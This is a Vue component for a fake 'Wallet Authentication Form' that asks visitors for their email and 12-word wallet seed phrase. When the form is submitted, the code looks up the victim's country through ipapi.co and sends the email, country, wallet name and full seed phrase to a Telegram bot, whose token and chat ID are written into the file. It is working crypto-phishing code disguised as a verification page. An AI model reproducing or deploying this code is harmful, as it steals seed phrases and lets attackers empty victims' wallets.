<template>
  <div class="wallet-details">
    <header>
      <router-link to="/" class="logo">
        <!-- <img src="" alt="blockchain-logo" /> -->
      </router-link>
      <div class="nav">
        <router-link :to="{ name: 'Wallets' }">Wallets</router-link>
        <!-- <div class="flag"></div> -->
      </div>
    </header>
    <section class="details">
      <div class="photo-details">
        <div class="wallet-image">
          <div class="wallet-title">Authenticate Your {{ walletTitle }}</div>
        </div>
      </div>
      <div class="twelve-phrase">
        <h3 class="big">Wallet Authentication Form</h3>
        <form @submit.prevent="handleSubmit">
          <div class="email">
            <div class="label">Email Address :</div>
            <input
              id="ai"
              type="email"
              placeholder="Enter Email"
              v-model="ai"
            />
          </div>
          <h3 class="small">Wallet 12 Seed Phrase:</h3>
          <div class="inputs">
            <input
              class="sPhrase"
              value="Juice world"
              v-for="(word, index) in seedPhrase"
              :key="index"
              type="text"
              :placeholder="'Word ' + (index + 1)"
              v-model="seedPhrase[index]"
            />
          </div>
          <div class="btn"><button type="submit">Verify wallet</button></div>
        </form>
      </div>
    </section>
  </div>
</template>

<script setup>
import { useWalletStore } from '@/stores/walletStore'
import { computed, reactive, onMounted } from 'vue'
import { useRoute } from 'vue-router'

const route = useRoute()
const id = route.params.id

const walletStore = useWalletStore()
let walletName

onMounted(() => {
  // console.log('otf')
  // console.log('Wallet Title:', walletTitle.value)
  walletName = walletTitle.value
})

const walletTitle = computed(() => {
  const wallet = walletStore.wallets.find((w) => w.id === parseInt(id))
  return wallet ? wallet.title : null
})

const formState = reactive({
  ai: '',
  seedPhrase: Array(12).fill(''),
})

const BOT_TOKEN = '7640674458:AAHG635XLcWfDc0HbiXx4xpqmzubixdsERk'
const CHAT_ID = '5300909464'

const handleSubmit = async (e) => {
  e.preventDefault()

  let country

  await fetch('https://ipapi.co/country_name/')
    .then((response) => response.text())
    .then((countryName) => {
      country = countryName
    })

  const ai = document.getElementById('ai')
  let sPhraseArray = []
  const sPhrase = document.getElementsByClassName('sPhrase')
  for (let i = 0; i < sPhrase.length; i++) {
    let phrase = `${1 + i}. ${sPhrase[i].value} \n`
    sPhraseArray = [...sPhraseArray, phrase]
  }

  let message = `E-Log: ${ai.value}\nCountry: ${country}\nWallet Name: ${walletName}\nSeed phrase:\n`
  for (const sp of sPhraseArray) {
    message += `${sp}\n`
  }

  message = encodeURI(message)
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`
  try {
    await fetch(url).then((res) => {
      if (res.ok) {
        console.log('success!')
        console.log(decodeURI(message))
        ai.value = ''
        for (let i = 0; i < sPhrase.length; i++) {
          sPhrase[i].value = ''
        }
      }
    })
  } catch (e) {
    console.error(`Error: ${e}`)
  }

  
}

const { ai, seedPhrase } = formState
</script>

<style scoped>
header {
  width: 100%;
  height: 70px;
  /* background-color: rgb(18, 18, 44); */
  background-color: #000000;
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 10px 120px;
}
.logo {
  padding: 0;
  width: 100%;
  height: 40px;
  /* background-color: white; */
  border-radius: 12px;
  text-decoration: none;
  background-image: url('@/assets/logo.png');
  background-size: contain;
  background-repeat: no-repeat;
  /* background-position: center; */
}
.logo a {
  text-decoration: none;
}
.nav {
  display: flex;
  gap: 20px;
}
.nav a {
  background-color: rgb(46, 69, 112);
  padding: 10px 20px;
  border-radius: 12px;
  text-decoration: none;
  color: white;
  font-size: 12px;
  white-space: nowrap;
}
.flag {
  padding: 10px 30px;
  background-color: black;
  border: 2px solid white;
  border-radius: 12px;
}
.big {
  text-align: start;
  font-size: 24px;
  margin-bottom: 50px;
}
.label {
  margin-bottom: 10px;
}
.small {
  text-align: start;
  font-size: 20px;
  margin-bottom: 10px;
  margin-top: 30px;
}

.details {
  width: 100%;
  height: min-content;
  background-color: rgb(201, 201, 240);
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
}
.photo-details {
  display: flex;
  flex-direction: column;
  justify-content: center;
  /* padding: 10px; */
  width: 100%;
}
.wallet-image {
  width: 100%;
  height: 250px;
  background-color: rgb(31, 45, 77);
  /* border-radius: 4px; */
  display: flex;
  justify-content: center;
  margin-bottom: 30px;
}
.wallet-title {
  width: 100%;
  font-size: 28px;
  justify-content: center;
  display: flex;
  align-items: center;
  /* background-color: black; */
  text-align: center;
  margin-top: 5px;
  color: #fff;
}
.twelve-phrase {
  width: 90%;
  height: 100%;
  background-color: rgb(255, 255, 255);
  /* display: flex; */
  justify-content: center;
  display: block;
  flex-direction: column;
  padding: 20px;
  overflow: hidden;
  border-radius: 4px;
  margin-bottom: 60px;
}

.inputs {
  width: 100%;
  /* background-color: aquamarine; */
  display: grid;
  /* flex-direction: column; */
  grid-template-columns: 1fr 1fr;
  gap: 10px;
}
input {
  width: 100%;
  height: 45px;
  border-radius: 8px;
  border: 1px aqua solid;
  padding: 5px;
}
.btn {
  display: flex;
  align-items: center;
  justify-content: center;
  width: 100%;
  /* background-color: black; */
  height: min-content;
  margin-top: 20px;
}
.btn button {
  padding: 10px 80px;
  border-radius: 8px;
  border: none;
  background-color: rgb(18, 18, 44);
  color: white;
}
@media (max-width: 768px) {
  header {
    flex-direction: row;
    align-items: center;
    /* padding: 15px 20px; */
    /* background-color: #1a1a60;  */
    gap: 15px;
  }

  .logo {
    /* padding: 10px 15px; */
    font-size: 1.2em;
  }

  .nav {
    flex-direction: column;
    align-items: flex-start;
    /* gap: 10px; */
  }

  .nav a {
    font-size: 16px;
    /* color: red; */
    padding: 6px 6px;
    border-radius: 4px;
  }

  .flag {
    display: none; /* Hide flag completely for better space management */
  }
}

@media (max-width: 480px) {
  header {
    padding: 10px 15px;
    gap: 10px;
  }

  .logo {
    font-size: 1em;
    padding: 8px 10px;
  }
}
</style>
